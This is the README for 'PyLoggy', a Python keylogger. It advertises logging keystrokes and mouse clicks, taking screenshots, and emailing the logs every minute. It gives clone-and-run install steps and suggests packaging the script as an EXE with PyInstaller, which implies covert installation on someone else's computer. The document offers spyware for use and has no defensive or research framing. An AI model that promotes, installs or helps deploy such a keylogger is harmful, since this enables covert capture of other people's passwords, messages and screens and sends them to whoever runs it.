# PyLoggy
PyLoggy is simple and powerful Python keylogger that is able to log keystrokes, log mouse clicks, take screenshots and more! The tool will send the logs to your email every minute(you can change this).

### Installation
1. Clone it:
`git clone https://github.com/D4Vinci/PyLoggy.git `

2. Run it:
`python PyLoggy.py`


*You can also convert PyLoggy to EXE using PyInstaller or any similar tool.*




